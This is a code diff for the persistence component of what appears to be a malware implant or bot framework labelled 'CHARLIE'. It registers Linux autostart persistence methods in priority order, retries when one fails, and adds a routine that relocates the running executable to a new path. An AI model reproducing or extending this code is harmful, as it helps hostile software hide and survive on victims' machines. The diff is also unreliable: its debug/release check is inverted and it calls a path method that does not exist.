@@ -4,7 +4,7 @@
 #include <boost/thread.hpp>
 
 // Linux persist methods
-#include <modules/persist/methods/linux/PersistHome.h>
+#include <modules/persist/methods/linux/PersistAutostart.h>
 
 using namespace modules::persist;
 
@@ -71,7 +71,9 @@ void PersistModule::module_main()
 
   // This is ordered by priority
   // Register all of our persist methods
-  REGISTER_METHOD(PersistHome);
+#ifdef CHARLIE_PersistAutostart_AVAILABLE
+  REGISTER_METHOD(PersistAutostart);
+#endif
 
   // Init all of the methods
   for(auto &i : methods)
@@ -94,7 +96,7 @@ void PersistModule::module_main()
   // If so, let's just stay the way we are.
   if(activeMethod && ix == 0)
   {
-    CLOG("We are already using the best persist method.");
+    MLOG("We are already using the best persist method.");
     return;
   }
 
@@ -102,14 +104,14 @@ void PersistModule::module_main()
   methods.erase(std::remove_if(methods.begin(), methods.end(), [](std::shared_ptr<PersistMethod> i){ return !i->canUse();}), methods.end());
   if(methods.size() == 0)
   {
-    CERR("There are no persist methods that work on this system.");
+    MERR("There are no persist methods that work on this system.");
     return;
   }
 
   // Now, let's pick the first one and see if it's already in use
   if(activeMethod && methods[0] == activeMethod)
   {
-    CLOG("We are already using the best persist method.");
+    MLOG("We are already using the best persist method.");
     return;
   }
 
@@ -124,14 +126,27 @@ void PersistModule::module_main()
     activeMethod = methods[0];
     if(activeMethod->setup())
       break;
+
     // Setup failed, clear
     activeMethod.reset();
+    methods.erase(methods.begin());
   }
 
   if(!activeMethod)
   {
-    CERR("Persist failed, no supported methods for this system.");
+    MERR("Persist failed, no supported methods for this system.");
   }
+}
+
+void PersistModule::startMigrateTo(boost::filesystem::path& path, std::string& targetExecutableName)
+{
+#if NDEBUG
+  MLOG("Debug mode, not actually migrating to "<<path.str()<<"...");
+#else
+  if(manager->prepareToRelocate()){
+    mInter->relocateEverything(path.c_str(), targetExecutableName.c_str());
+  }
+#endif
 }
 
 PersistInter::PersistInter(PersistModule * mod)
